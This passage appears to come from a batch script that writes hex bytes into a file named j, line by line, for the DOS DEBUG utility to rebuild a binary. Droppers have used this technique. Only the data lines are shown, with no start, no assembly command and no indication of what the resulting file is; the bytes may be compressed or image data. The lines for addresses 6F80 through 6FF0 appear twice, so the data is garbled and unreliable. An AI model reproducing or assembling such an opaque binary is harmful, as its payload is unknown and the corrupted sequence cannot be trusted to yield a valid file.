echo e 6520 C5 23 A7 00 DC 67 E6 68 7D 96 47 8F 79 00 03 D0>>j
echo e 6530 56 4D D5 B3 2C ED 8E 0D 6D 8B B7 F2 44 65 79 F5>>j
echo e 6540 AC EB 97 1B C8 3D 6B CB 94 E4 E7 AE C7 A3 88 C3>>j
echo e 6550 CA 52 53 96 C6 23 33 45 2E 33 5D 3E 85 7F E5 EA>>j
echo e 6560 16 CE E7 E5 5E 0E 6B 02 4B 71 23 93 9E 45 4B 6D>>j
echo e 6570 33 45 32 9F 4A E9 8C B5 F7 4A A5 17 1B A7 B3 D8>>j
echo e 6580 EE BC 57 34 3A AC 31 A4 7B 40 19 F4 F6 FF 00 0A>>j
echo e 6590 F3 9D 52 1F B2 5D 6C C8 3C 0A EA B4 E9 8D CC AE>>j
echo e 65A0 B2 36 46 09 02 B9 8D 7C 30 D4 08 F4 02 AE 11 FB>>j
echo e 65B0 CE 7C 6D 38 D3 A5 A6 E6 62 BE E7 03 D6 BA 5F 0C>>j
echo e 65C0 A0 4B D7 2D 83 F2 9C 7E 46 B9 50 71 28 27 D6 BA>>j
echo e 65D0 6F 0E 5C AB 5F 3A 37 19 07 07 F0 35 72 72 B6 87>>j
echo e 65E0 97 42 6B 9B 53 61 EC 24 B8 53 2A 11 8D DC 8A E8>>j
echo e 65F0 6C 52 21 A7 88 C7 DF 0A 2B 1E 3B E1 02 B4 60 77>>j
echo e 6600 EB 5A A9 09 36 0F 70 AC 39 5D C0 54 D2 C2 CA 75>>j
echo e 6610 12 96 89 9D D3 A4 EE 9A D8 A7 AD 18 E7 D0 24 49>>j
echo e 6620 71 C1 E2 BC CA E6 36 46 19 04 02 32 33 DE BD 2A>>j
echo e 6630 04 FE D2 B3 36 F2 0D A0 9E A6 B9 AF 15 E9 70 D9>>j
echo e 6640 4F 04 11 BE 5B CB 04 FE 67 FC 2B B2 BD 38 D3 B4>>j
echo e 6650 51 C3 5E 9F 63 94 8F 1B 86 6A CB 80 13 8E BD 2A>>j
echo e 6660 BB 27 97 26 2A DC 91 ED 80 3E 7A D7 2B 31 A4 B4>>j
echo e 6670 69 95 8A E1 B0 4F 15 24 52 2A 13 9A 63 38 65 F7>>j
echo e 6680 A6 E0 53 B5 C9 E6 E5 7A 0A CC 0E 6A 78 08 DA 6A>>j
echo e 6690 A8 1F 36 2A D4 4A 11 4E 4D 27 A6 C5 52 93 E6 B8>>j
echo e 66A0 C2 3E 73 CE 05 46 BD 0E 3A D3 D8 E7 A7 7A 63 8D>>j
echo e 66B0 8D 81 42 BD 85 3D 18 AB 95 3D 6A E4 2E BE 58 C9>>j
echo e 66C0 AC FE 49 AB 31 A8 D8 39 C5 5A 8A 61 4E 6D 0F 8E>>j
echo e 66D0 52 14 90 71 5A 70 5C 32 C2 A0 37 5A C7 09 C1 A9>>j
echo e 66E0 63 63 81 CF 22 B3 93 E6 D8 EB A1 55 C5 EA 75 76>>j
echo e 66F0 B7 F2 C9 7A 1D 9F 68 09 8E B8 AE B7 C3 5A 9A 66>>j
echo e 6700 75 96 60 AC 48 DB 93 D6 BC D6 D6 ED 8B 60 F5 C5>>j
echo e 6710 69 D8 CA EE AE CA 48 65 39 E0 D4 C2 6F 9A CC DA>>j
echo e 6720 4A 13 5A 1E CE B2 07 B4 EB C9 EF 4B 7A 31 67 CF>>j
echo e 6730 A7 F4 AC 1D 16 F8 B6 9F 10 94 F3 8E 2B 76 59 05>>j
echo e 6740 C5 BE D0 7B 56 CF C8 F3 65 A3 B1 CF DA C4 93 4F>>j
echo e 6750 20 71 C0 20 8A 25 7C 5D 32 87 C2 0C 74 A9 85 9C>>j
echo e 6760 86 46 08 48 C9 ED 59 F2 44 E9 74 51 BA E4 0A 56>>j
echo e 6770 69 5D 95 CD 68 DC E8 A2 DB 2C 00 11 90 45 51 BC>>j
echo e 6780 B7 16 EC 18 0C 29 A9 AD A7 58 CA C2 47 CD 8A 35>>j
echo e 6790 81 FE 8C 87 35 8D 3B F5 26 FD 48 ED 6E D4 7C BB>>j
echo e 67A0 AB 50 CA B2 5B B8 23 76 47 4A E5 20 62 66 00 1E>>j
echo e 67B0 F5 BD 0B B2 47 9C D6 AA 6A 2A C2 8B 6C 8E 5D 3A>>j
echo e 67C0 D6 48 D1 A4 B6 0C 73 81 91 9E 2B 8C D4 EC C4 7A>>j
echo e 67D0 C3 AA DA B2 C2 33 8C 27 EB 5E 86 84 DC 42 A1 48>>j
echo e 67E0 04 1A 8A 5B 68 8C C5 66 55 67 2B 8C 91 4A EE C6>>j
echo e 67F0 F1 AB C8 78 85 D5 A4 AB 35 C2 0B 77 E4 FC BF 29>>j
echo e 6800 AA 13 5A CB 0A 2B 3C 4C 81 BA 64 62 BD 76 EB 42>>j
echo e 6810 75 B6 B8 9D F6 11 D4 60 72 B5 C5 EB 31 13 A7 82>>j
echo e 6820 E0 13 BB 03 DA AE 2F DD D4 DF 96 32 57 4C E4 C1>>j
echo e 6830 C0 AD 38 59 0D 9A 9D BC 81 C9 C5 67 DD 5B B5 BC>>j
echo e 6840 A5 18 8C FB 54 90 DC 6D B7 68 CF 71 51 69 37 74>>j
echo e 6850 C2 32 E5 60 19 41 26 95 5B 71 39 15 04 6A 5D BA>>j
echo e 6860 E2 A6 2A C9 C6 73 51 37 AD 84 EA 36 D2 42 0D C1>>j
echo e 6870 F9 E9 52 91 DC 54 8A A3 60 F5 A5 44 DE FB 40 A8>>j
echo e 6880 6E CF 43 59 45 47 5B 90 12 5B 8C 54 90 00 58 06>>j
echo e 6890 1F 4A 26 4F 26 5D A7 AD 11 65 5D 49 3C 66 B5 72>>j
echo e 68A0 E7 77 21 6B B1 70 C6 CA DC 8C 8A D0 D3 23 3F 67>>j
echo e 68B0 76 23 92 48 C1 AA 6F 76 36 F4 C0 AB BA 55 ED BA>>j
echo e 68C0 D9 4E 25 1F 30 24 A9 A9 85 47 CC 5C E6 E2 D1 A2>>j
echo e 68D0 C2 21 02 EF 0B BC 54 56 12 63 51 45 FE 03 4B 15>>j
echo e 68E0 AB DF 47 13 A9 DA 1B 02 AD BE 87 71 61 39 95 DC>>j
echo e 68F0 14 03 83 ED 5B 4D 26 B4 7A 9A 61 E4 9A 6A F7 6C>>j
echo e 6900 B5 77 24 05 81 3B 40 AE 7E 6C 3D F0 D9 CA EE C7>>j
echo e 6910 EB 52 5F 39 90 6D 5C F5 A9 6D 34 E9 9A 14 B8 1C>>j
echo e 6920 A8 23 35 2A 13 A7 1B CC B5 68 3B BD 0D DB BB 58>>j
echo e 6930 A3 D3 FE 58 80 C0 E4 E2 A1 D1 DE 1B 7B 77 07 6F>>j
echo e 6940 E3 52 5F EA 71 9B 26 4C 72 06 2B 22 DE D2 6B D8>>j
echo e 6950 5E 58 9C 8C 0C 63 D6 B8 A0 F9 A0 F9 B4 38 D4 E4>>j
echo e 6960 E7 BD CD 0B B4 0E E4 C6 B9 07 A1 1E B5 97 69 6F>>j
echo e 6970 38 BE 50 C0 ED DD 5A B1 DB 5C 45 64 91 12 72 A7>>j
echo e 6980 39 A8 6D 66 2D 78 13 39 ED 9A D2 95 55 4E 2D 2D>>j
echo e 6990 4B 6E 4E 49 34 69 5D F9 71 46 9D 01 35 CC EA 37>>j
echo e 69A0 52 7D AF 60 C9 52 2B A2 BE B5 24 20 2F CF 5A CC>>j
echo e 69B0 9B 48 96 49 04 C8 C3 6E 39 A7 09 5A 37 7D 4D A6>>j
echo e 69C0 A4 95 91 8B 3C 40 C6 64 4F E1 E6 B3 F0 67 27 3C>>j
echo e 69D0 D6 B9 52 D1 BC 48 3E 6C 11 59 AD 0C 96 D9 2C 30>>j
echo e 69E0 A3 BD 6F 4D DE 3A 9C F5 A5 77 B6 86 FF 00 87 5F>>j
echo e 69F0 C9 B4 95 01 C1 04 7F 5A DA B7 30 3C E9 B8 8C 93>>j
echo e 6A00 CD 71 96 BA 92 C4 AC 01 23 35 6E C2 EC C9 78 AC>>j
echo e 6A10 CE 4E 0F AF 6A 76 7C D7 4C C9 49 45 DE 27 4B E2>>j
echo e 6A20 BB 38 86 92 8D 10 0D 96 CE 40 AE 2E D5 5B 90 A3>>j
echo e 6A30 BE 45 76 5A ED DA 4D A7 2C 48 78 C0 E2 B9 BB 74>>j
echo e 6A40 28 30 40 A2 AC B6 15 66 9A BA 7A 96 D6 D8 0B 74>>j
echo e 6A50 62 06 E3 C9 AA B7 28 70 C4 8F A5 5E 92 EA 31 12>>j
echo e 6A60 8C 7C C0 73 59 F7 B7 29 29 50 A7 9E F5 36 EA 8C>>j
echo e 6A70 5B D7 52 0B 79 E5 31 B2 EE EF D2 BA A8 16 41 A7>>j
echo e 6A80 C5 2B 29 3F 20 ED ED 5C B4 29 B5 F2 A3 20 D7 57>>j
echo e 6A90 F6 E0 B6 36 D0 63 AA 00 4D 29 CA ED 23 5A 4D C5>>j
echo e 6AA0 DC AF 24 81 A1 3F 27 3D F8 AC FB FB 55 46 42 13>>j
echo e 6AB0 82 32 6B 5D 14 45 20 27 0C 33 D2 A7 BC 28 EA B9>>j
echo e 6AC0 8C 6D 1E D4 46 76 D8 D1 B6 E5 CA CE 2A E0 2F 9A>>j
echo e 6AD0 78 A7 16 1B 14 31 E2 9D 74 BE 6D E4 98 18 C1 A8>>j
echo e 6AE0 65 1F BB C0 EA 29 CA DB 5F 52 93 B5 D0 C9 70 AF>>j
echo e 6AF0 8C E4 67 B5 5B B2 31 8C E4 F7 E9 59 CB F3 1C 1E>>j
echo e 6B00 B4 ED EC AF E9 53 CA E2 AE CA A3 53 D9 C9 48 E8>>j
echo e 6B10 C8 56 E8 2B 36 E2 3D F3 1C 21 CD 6A 5A 02 C8 8C>>j
echo e 6B20 07 E7 52 43 01 7B 86 6F 97 A5 79 70 69 B7 76 7A>>j
echo e 6B30 B4 6A 4A A4 1F 33 D0 E6 24 86 60 E4 EC 6C 7D 29>>j
echo e 6B40 A0 71 9E F5 D2 5F 5C 45 06 63 60 B9 C7 A5 61 1C>>j
echo e 6B50 07 DE 07 04 D7 55 0C 43 8A 69 A2 53 8A 6A 37 2C>>j
echo e 6B60 58 5C 18 64 27 38 E0 D2 5F 5B 0B 80 B2 15 DC 4E>>j
echo e 6B70 79 A6 90 AC 3E 50 01 22 AF D9 DD 43 1D AC 71 C9>>j
echo e 6B80 82 C0 9A D2 12 6A 37 2A AB 4E 9D 99 C8 DC 47 99>>j
echo e 6B90 F6 2C 64 60 FA 53 8B 4B 67 3A C8 BF 2B 56 FB 5A>>j
echo e 6BA0 09 AE F7 46 3E F3 73 F4 A3 54 D1 2E 1A 4C 2E 3E>>j
echo e 6BB0 50 0F E1 5D B4 A4 9C 7D ED 0F 19 D3 51 D7 A9 5E>>j
echo e 6BC0 DA F0 CD 6D BD DC 6E DD EB 5D AC 0C 9F D8 0A 77>>j
echo e 6BD0 8F B8 3B FB 57 98 48 5A 09 4C 47 82 0F 6A EA AC>>j
echo e 6BE0 AE 25 7D 25 63 2C 70 57 1D 7D A9 4E 95 4A 92 5C>>j
echo e 6BF0 8C E9 A3 55 CD 72 B6 58 4B DF 2A 15 31 BE 14 1E>>j
echo e 6C00 B9 F6 AE 6F 5C BE 7B AD 49 24 77 CF EE C0 1C FB>>j
echo e 6C10 9A 9E EE CA EE DB 4D 2E CF C6 EC 63 3E D5 81 3B>>j
echo e 6C20 EE DA 73 92 06 29 C9 EB 6E A7 26 22 A5 9D BA 97>>j
echo e 6C30 AD 2C 45 FD C2 C2 AE AA EE 70 09 F5 C7 15 46 56>>j
echo e 6C40 75 26 36 EA A4 83 5A 5E 1E 94 0D 62 D5 5B BC 83>>j
echo e 6C50 15 73 49 D0 A2 D5 4E B3 71 3C A6 34 B6 07 61 07>>j
echo e 6C60 AC 8C C7 68 3E D8 07 F4 A8 B1 CF 39 6C D7 53 0A>>j
echo e 6C70 D8 0D C7 77 4A 74 C1 49 01 6A 4D 42 CD AC 35 1B>>j
echo e 6C80 9B 55 25 C4 2E 50 B0 1D 6A A0 63 BC 1A 6F 51 46>>j
echo e 6C90 6A DC A4 C2 3E 69 CA A5 BE 5F 5A 42 59 79 A9 62>>j
echo e 6CA0 72 57 E9 51 76 6F 15 1B D8 8A 40 10 63 BD 40 32>>j
echo e 6CB0 5B 26 A4 94 92 F8 CE 69 1C 85 C0 15 77 32 9D 9B>>j
echo e 6CC0 1C 23 50 09 CD 21 7C 74 E9 51 EF 27 34 F5 03 1C>>j
echo e 6CD0 D2 49 89 49 74 2C A3 07 1C 8E 69 CF 11 11 82 2A>>j
echo e 6CE0 B4 2C 57 AD 68 A3 A3 C0 14 FD E1 D2 97 2D 8E AA>>j
echo e 6CF0 6D 4D 79 95 51 CA 38 6E FD EB A1 D1 C7 9A B2 48>>j
echo e 6D00 A4 71 C1 15 84 D1 12 C7 03 9C 56 9E 9B 32 C4 CF>>j
echo e 6D10 91 8E 31 C7 AD 6B 08 A5 EF 20 94 9C 15 8E F7 4B>>j
echo e 6D20 BA 89 55 62 24 11 8C 8F 63 5B 96 D7 6C AC 2B 85>>j
echo e 6D30 DE A6 15 91 1B 6B F7 E6 B6 2C B5 85 2B 1A 38 C3>>j
echo e 6D40 F4 3C FE B4 9C 35 BB 66 12 85 F5 47 6B 04 F1 C8>>j
echo e 6D50 32 00 0D E9 55 2E 2C 04 92 F9 80 E0 E7 35 9B 0D>>j
echo e 6D60 C8 60 1D 5B A9 EB 5A 76 D7 BB 98 24 98 FA D4 CA>>j
echo e 6D70 ED 58 85 D9 91 4F 01 85 D6 71 D5 46 2A BD E5 E7>>j
echo e 6D80 DA 51 62 03 F1 AD 7B 84 12 42 40 E7 35 8E F6 8E>>j
echo e 6D90 5C ED 1C 8A 8A 6B 4B 31 32 96 D5 81 D5 87 24 55>>j
echo e 6DA0 C1 78 1E 1C 67 18 A8 A2 B3 32 3F EF 0E 31 DA AF>>j
echo e 6DB0 5C 5A C3 1D B3 32 AF 38 AA E4 BB 1C 53 7B 12 59>>j
echo e 6DC0 DC 7C C1 83 75 15 A0 63 4B 89 43 16 21 85 72 F1>>j
echo e 6DD0 4A EA C1 50 77 AD 4B 2B A6 13 10 E7 91 4D 45 2D>>j
echo e 6DE0 0A B7 72 FC B6 82 E6 CE E2 0F 34 A1 6E 03 67 DC>>j
echo e 6DF0 57 27 E2 5F 0C C5 6D A7 A9 59 CB 9F 33 AF A5 75>>j
echo e 6E00 8B 3A AA CB F2 F1 D4 D5 5B C3 6F 75 63 89 46 79>>j
echo e 6E10 C8 AB 97 BD 1E 5E 83 8C 9A 3C 8E FF 00 4D 5F B6>>j
echo e 6E20 B2 64 F2 78 E7 3C 56 2C 8B E5 B9 5E 78 F5 AF 4B>>j
echo e 6E30 BE 8E C9 75 70 3C A0 00 F6 AE 4B 55 B4 49 1E E2>>j
echo e 6E40 44 88 8C 7A 0A 95 68 2D 0F 42 50 8C E3 78 E9 63>>j
echo e 6E50 04 80 AA 0A 9A 95 5F 76 0D 54 09 23 1C 00 6A 61>>j
echo e 6E60 1C A9 26 C2 8C 18 63 8C 54 3B 5E E7 1C 65 69 2D>>j
echo e 6E70 0B 42 4E 47 3C 9A 9D 5B CB 60 E2 A8 F4 71 9A D0>>j
echo e 6E80 91 E3 7B 60 00 19 F5 A9 94 53 D5 1D 7C AE 44 17>>j
echo e 6E90 0C 25 6D E7 AF 4A 8F 7E 08 F6 A7 82 06 2A BC 87>>j
echo e 6EA0 E7 26 9F B2 B2 B9 4E D0 2D 99 95 FE 5C 76 A5 45>>j
echo e 6EB0 68 55 8E 38 3C D5 58 7E 79 80 4A B3 3C 8C AB 82>>j
echo e 6EC0 7A 71 5B 51 A7 15 EF 22 9C 95 48 5E 46 95 87 88>>j
echo e 6ED0 1E 29 21 83 00 05 61 CF E5 5D 64 DA C1 BE FD C1>>j
echo e 6EE0 1B 41 15 E6 50 13 F6 B4 39 E8 C0 D7 55 04 E3 CF>>j
echo e 6EF0 1B 9B 6B 11 D6 A3 91 73 B9 F5 23 05 4D 3B B2 EC>>j
echo e 6F00 B6 9B 9C 90 6A 58 EF 5A 08 56 D8 0F 97 77 35 0D>>j
echo e 6F10 BC E8 D3 4A 37 E5 45 47 71 24 6B 86 57 19 DD EB>>j
echo e 6F20 4E AC A5 53 DD 66 AE D2 6E 33 37 D7 48 49 CA 07>>j
echo e 6F30 1F 2B 75 E6 A7 92 C5 34 A8 F6 40 73 93 93 59 6D>>j
echo e 6F40 A8 CD 1A 82 B2 7B D5 CD 36 EC DE F9 86 66 07 03>>j
echo e 6F50 8A E6 A7 0B C5 C6 48 E4 84 A3 19 3B 94 EE B5 76>>j
echo e 6F60 84 34 65 49 E2 A8 58 4E 7E D8 87 1F C5 46 AF B7>>j
echo e 6F70 ED C7 04 6D 3C 56 8C 56 F1 C5 87 D8 01 F5 C5 38>>j
echo e 6F80 E1 95 EC B6 3B E9 38 55 25 D4 6F 48 DB B7 93 50>>j
echo e 6F90 47 7E EB 1B 02 0F E5 52 4C 23 66 43 C1 E6 B4 A3>>j
echo e 6FA0 8E CF CA 74 C0 2C C2 9A A5 1B F2 31 56 BC 15 CE>>j
echo e 6FB0 12 CE E1 FF 00 B4 19 5F 90 5A AE 6B A1 56 08 D1>>j
echo e 6FC0 72 03 54 7E 4F 95 72 5B 6E 30 D8 CD 49 AC BA B4>>j
echo e 6FD0 31 EE 23 E5 AE C9 42 D1 51 47 2E 26 9D A2 9F 73>>j
echo e 6FE0 06 78 3C 94 52 87 39 AD 5D 32 12 90 99 31 9C 75>>j
echo e 6FF0 AA A1 43 AA E7 EE F6 CD 74 56 71 C6 2C A4 8C 11>>j
echo e 6F80 E1 95 EC B6 3B E9 38 55 25 D4 6F 48 DB B7 93 50>>j
echo e 6F90 47 7E EB 1B 02 0F E5 52 4C 23 66 43 C1 E6 B4 A3>>j
echo e 6FA0 8E CF CA 74 C0 2C C2 9A A5 1B F2 31 56 BC 15 CE>>j
echo e 6FB0 12 CE E1 FF 00 B4 19 5F 90 5A AE 6B A1 56 08 D1>>j
echo e 6FC0 72 03 54 7E 4F 95 72 5B 6E 30 D8 CD 49 AC BA B4>>j
echo e 6FD0 31 EE 23 E5 AE C9 42 D1 51 47 2E 26 9D A2 9F 73>>j
echo e 6FE0 06 78 3C 94 52 87 39 AD 5D 32 12 90 99 31 9C 75>>j
echo e 6FF0 AA A1 43 AA E7 EE F6 CD 74 56 71 C6 2C A4 8C 11>>j
echo e 7000 96 5C D6 5F 09 CD 08 45 22 BF 9D E6 0E 7E E8 A5>>j
echo e 7010 58 54 A1 90 1E 82 A1 11 33 C2 D1 EE DA 7D 69 F6>>j
echo e 7020 A8 C9 6F 22 64 B7 A5 67 28 DF 53 06 AC EE 53 49>>j
echo e 7030 4C B7 1E 59 1F 2E 71 52 DC E9 E1 18 B0 6E 3B 53>>j
echo e 7040 DD 04 0A 5C A6 1B 19 15 49 27 9A E5 8E 73 EB 8A>>j
echo e 7050 AB 27 B1 A4 23 CF 25 72 37 BB 31 9C 20 3C 70 6B>>j
echo e 7060 55 EF DE 58 6D 97 66 3E E8 35 1E 99 6D 14 85 D2>>j
echo e 7070 55 24 93 DC 54 92 ED 82 F7 C9 23 E5 43 C5 53 A3>>j
echo e 7080 65 73 A6 74 25 1D 8D BB A8 8C 51 24 80 F6 06 9C>>j
echo e 7090 64 F3 2D D3 27 FC E2 A7 80 47 3D 8A B4 AC 30 17>>j
echo e 70A0 BD 56 66 4F 91 62 21 B2 B4 52 82 5A A1 BA 6D D9>>j
echo e 70B0 9C CD C0 55 9E 52 1B 9D C6 A8 19 F2 1B 35 66 F3>>j
echo e 70C0 77 DA 25 CF 04 13 59 A0 EE 56 F5 06 A6 74 ED 2E>>j
echo e 70D0 63 07 17 06 C4 DF B5 83 03 CE 69 F9 E3 76 6A 36>>j
echo e 70E0 4C 26 48 C5 30 9C 00 05 4C 9F 36 84 DA FB 9D 46>>j
echo e 70F0 9D 76 4E D5 3D 2A C8 9D 62 91 9B 24 E4 1A C4 B4>>j
echo e 7100 76 49 D4 13 C5 6B DB AA C8 CC 0F 4A E4 85 28 2B>>j
echo e 7110 A9 2D CF 63 0A DF 25 9A 33 6E 37 DD 5E 33 63 80>>j
echo e 7120 2A 3D 8E E0 0C 77 C5 6A 08 01 66 2A 0D 43 14 40>>j
echo e 7130 DC 22 7B F3 56 A8 A6 EC B6 3A 63 45 47 DE B1 5E>>j
echo e 7140 58 1A 24 56 35 53 19 90 91 DB B5 6D 6A 10 92 C1>>j
echo e 7150 57 92 2B 2A E6 27 8C E5 46 0E 39 AD 29 D3 E5 97>>j
echo e 7160 2B 32 C5 5A 30 4C BF A7 E0 BA 39 3D FA 56 A6 B6>>j
echo e 7170 CF 15 98 95 48 F9 B8 AC 7D 1F 63 CD 08 76 E4 B7>>j
echo e 7180 22 B6 7C 44 01 85 23 4C 63 35 DF EC B9 E1 CA 8F>>j
echo e 7190 2A 30 53 67 1D 35 82 CC 44 DB BE 66 E7 15 A5 63>>j
echo e 71A0 28 58 56 03 DB 8A 95 61 45 DB D3 22 96 E1 11 2D>>j
echo e 71B0 D9 95 3E 70 32 08 A5 0B D2 56 4C EC 8E 1D 41 F3>>j
echo e 71C0 21 FA E4 67 FB 35 3E 61 82 7A 66 B8 CB D8 7C 89>>j
echo e 71D0 95 73 9C 8C D7 41 23 5C 5D DA 61 B7 1D A7 8A C7>>j
echo e 71E0 D5 E3 D9 34 60 86 07 60 C8 3F 53 58 B4 DB E6 EE>>j
echo e 71F0 79 F8 D8 7B DC C8 D9 D0 74 12 F3 69 B7 62 E5 7C>>j
echo e 7200 F9 41 B8 58 76 F5 8D 5D 90 9C FA E5 4F 1E 95 99>>j
echo e 7210 6D 05 CB EA 33 F9 3B DA 35 94 3C 80 1E 30 1F A9>>j
echo e 7220 1F 8D 75 9E 12 01 B5 DF 07 A3 67 63 DA CA AE 3D>>j
echo e 7230 47 9D 36 6A 4D 3D 2C 2E 7C 51 A7 49 69 6C 21 B7>>j
echo e 7240 BB 69 AD DD 32 4F CC A7 AF D4 82 A6 86 72 41 27>>j
echo e 7250 B9 8F 7F AD AE 9B 37 88 EC 3C 96 76 BD 94 61 C3>>j
echo e 7260 60 2E 03 83 91 DF EF E7 EA 05 72 1B B9 AE C9 3C>>j
echo e 7270 33 71 AE E9 FA BE B7 34 82 11 15 D2 22 C8 EE 15>>j
echo e 7280 30 CC C0 93 DF A8 00 63 B9 AC AD 67 C3 43 4A 4B>>j
echo e 7290 97 4D 46 DE E8 5B CC 21 90 46 18 10 48 24 75 18>>j
echo e 72A0 EC 7A 13 49 10 F7 D0 C7 56 2C DD 6A 72 A4 0E 06>>j
echo e 72B0 2A AC 6F B5 B3 56 D2 50 C0 93 D6 9A 48 E9 A5 24>>j
echo e 72C0 D6 A4 41 40 E4 F5 CD 32 60 33 9C D5 99 59 0C 7C>>j
echo e 72D0 2F 35 49 9B 27 14 35 AD C8 AA 94 74 00 C0 1E 94>>j
echo e 72E0 ED E2 A2 A2 83 15 26 89 E3 E7 23 35 36 EF 2F 6F>>j
echo e 72F0 35 51 5B 69 E2 A6 53 B8 0C D2 66 D4 E7 A5 96 E5>>j
echo e 7300 F4 9C 24 8B 93 91 57 6D CA F9 32 64 65 58 FE 55>>j
echo e 7310 8E C0 E0 11 56 AD 2F 0C 43 0D C8 CF 22 9A 69 68>>j
echo e 7320 6E E7 7D 19 BB 6F 31 68 C4 4F C0 1D 0D 4B E6 ED>>j
echo e 7330 E4 36 EF C6 B3 7C E0 63 0E 0F 7A 58 A5 55 5C 82>>j
echo e 7340 73 E8 69 BE E8 CD 73 47 63 76 D7 52 92 1C 00 F9>>j
echo e 7350 50 41 23 D0 57 41 6B AB C3 72 54 A3 6D 38 1D 6B>>j
echo e 7360 88 89 F3 F3 00 07 AD 4D 1C 85 4E 43 6D 23 9C 8A>>j
echo e 7370 86 EC B4 2E D0 92 F3 3D 2E DF 50 6C A8 27 D2 B4>>j
echo e 7380 ED E6 8D E4 CF 1B 8D 79 FD 86 B1 80 89 37 E7 EB>>j
echo e 7390 5B B6 F7 C0 10 C8 D9 07 A1 A5 19 73 18 38 B4 74>>j
echo e 73A0 37 36 A0 C8 5D 08 E7 D2 94 42 5A 0D A4 76 AA 70>>j
echo e 73B0 6A 07 77 CE 72 2B 4A 1B 98 A5 E1 4F 4A D2 F6 45>>j
echo e 73C0 42 5D CE 7C DB 49 E7 B2 A8 C7 35 3C 76 97 0B 2E>>j
echo e 73D0 FD BF 2F AD 6C 34 48 65 C8 03 35 30 00 FC A0 74>>j
echo e 73E0 15 37 EA 5C DA 66 74 A0 CD 6C C8 9C 39 AA 13 58>>j
echo e 73F0 5E 1B 45 08 32 D9 E9 9E B5 71 1C C1 39 2C 32 B9>>j
echo e 7400 E2 AE C3 74 B3 73 8E 01 AA BA B1 09 A3 8C BD D1>>j
echo e 7410 AE AE 2F B7 EE 08 C3 8C 54 0F 08 8E D2 E1 65 45>>j
echo e 7420 2C 57 06 BB 99 6C 3C EB A1 20 7E 1B A8 AE 5B 57>>j
echo e 7430 D3 45 BA 4E 4B 1F 9B A8 A9 71 4F 46 76 C2 AB A8>>j
echo e 7440 B9 19 C6 41 A7 C9 B0 38 55 23 A9 18 ED 4D D5 2E>>j
echo e 7450 52 D6 F5 19 D5 72 C0 13 F8 01 5A 76 0B BD 1E 27>>j
echo e 7460 72 14 8C 1F 5A C8 D6 F4 E3 F6 B4 4D E4 F1 D7 F2>>j
echo e 7470 AC 1D 4E 59 5B A0 4E 8C 96 AD 1C FC D2 79 B7 0D>>j
echo e 7480 B4 70 4D 4B 82 AB 92 69 3C 8F 26 E9 93 AD 5B BD>>j
echo e 7490 B5 6B 7B 6D C7 3C 91 5A 73 75 1C 15 A2 DC 8A 83>>j
echo e 74A0 2C 3A D3 36 97 90 28 EA 78 A6 C7 28 03 15 34 6E>>j
echo e 74B0 AA E8 FE 87 35 4D B6 09 C6 49 16 60 B5 7B 79 03>>j
echo e 74C0 38 C0 A6 DD 9D E7 8A BF 67 74 B7 D7 2B 0E 07 3C>>j
echo e 74D0 FE 54 EB CB 20 B2 10 38 19 C5 38 C9 47 46 6B 2A>>j
echo e 74E0 90 8C 39 53 30 61 18 BA 8C 1F EF 0F E7 5D 0D E4>>j
echo e 74F0 04 2A CA A3 80 3A D6 21 89 92 F5 41 FE F5 74 BB>>j
echo e 7500 44 B0 A4 24 90 0F 34 72 29 6A 5E 0A DC B2 7D 8C>>j
echo e 7510 66 B9 78 8F CB 9C 1A AE 66 90 90 E5 CE 37 74 AD>>j
echo e 7520 D9 34 B8 97 E4 2D C1 EF 4C 7D 26 21 6C 64 EA 14>>j
echo e 7530 7E B5 3A 47 54 73 4E 5C F3 7C A3 46 A0 93 01 18>>j
echo e 7540 6E 6B 73 43 4F 38 4A AA 4E EC 75 AE 16 27 31 DC>>j
echo e 7550 7D 0D 75 7A 06 A6 60 49 8E DC E4 54 A7 27 22 B0>>j
echo e 7560 EA 35 13 4F 71 D7 F6 33 7D B4 F2 4A 8E 45 6E B4>>j
echo e 7570 C9 2D 8E 08 C1 DB 54 5A E4 DC 20 72 00 26 A6 23>>j
echo e 7580 76 C5 E0 60 73 55 ED 2D A0 55 52 8B E5 45 39 24>>j
echo e 7590 F2 D3 24 F3 4E B6 32 48 0C A8 DC 1A A7 AF 06 B5>>j
echo e 75A0 0B 28 60 32 71 B6 99 A5 6A 2C C8 A8 7A 67 15 2D>>j
echo e 75B0 69 CC CA 84 79 D6 E6 96 AB 7B 64 F0 61 54 07 03>>j
echo e 75C0 27 6F 1C D7 35 AA CB BE 34 23 35 D3 5E F8 78 7D>>j
echo e 75D0 99 A5 57 1B 88 DC 6B 07 54 B1 58 A3 84 EE E4 9A>>j
echo e 75E0 D2 15 14 D2 B1 75 A7 18 C3 97 A9 45 A4 3F 63 8D>>j
echo e 75F0 88 FB A6 A7 B7 BC 94 32 B2 37 5E 31 51 A6 D9 22>>j
echo e 7600 68 01 C7 BD 55 88 B5 BC D9 07 38 34 DC 7A 33 89>>j
echo e 7610 53 97 53 4E 77 9A 36 DC 5C 8C F5 AB 9A 7D FA 44>>j
echo e 7620 AC 1C 02 31 54 1C 8B F6 55 43 82 2A 39 55 AD E3>>j
echo e 7630 F2 8F 73 C9 AC DC 9A 14 FB 33 4A E6 EC 4E 38 C6>>j
echo e 7640 3B 53 74 ED A2 EB 27 9E 2A 99 85 42 2F CF 86 22>>j
echo e 7650 A7 B5 01 25 1F 37 20 55 41 DB 52 E3 68 EE 6B B9>>j
echo e 7660 55 B8 57 5E 9C 66 9B 2D 8B DC DC 17 5E 8D C8 AA>>j
echo e 7670 4F 76 61 4D C7 0C 33 5D 36 9B 18 9E D2 39 C1 C0>>j
echo e 7680 2A 38 FC 2B 49 4F 98 7C F5 27 2B 19 AF 6D 73 25>>j
echo e 7690 97 94 8C 15 87 3F 86 2A C6 8D A7 CF 1A 15 97 EF>>j
echo e 76A0 96 38 FA 62 B4 12 25 FB 41 40 78 F6 A9 9F 75 B4>>j
echo e 76B0 CA CA 72 08 AC 6F CA CD 6E A0 AF 7D 4E 27 50 B4>>j
echo e 76C0 95 B5 29 D7 76 30 4F 6A C6 D8 D6 D2 61 BB D7 67>>j
echo e 76D0 7B 12 BC D2 DC 31 EB 9C E3 D6 B8 7B A9 4B CC D9>>j
echo e 76E0 CF 06 A9 FB C8 CA 76 49 3E A5 AB A3 F2 03 E8 2B>>j
echo e 76F0 3C CA 4F 23 15 2C 8C 5D 54 13 C5 44 D0 8D B9 06>>j
echo e 7700 A2 CA 27 3C 9D DD D1 76 DA 72 F7 51 A0 E7 8E 6B>>j
echo e 7710 AB B5 40 13 FD AC 57 29 A7 C6 16 F5 0E 7A D7 53>>j
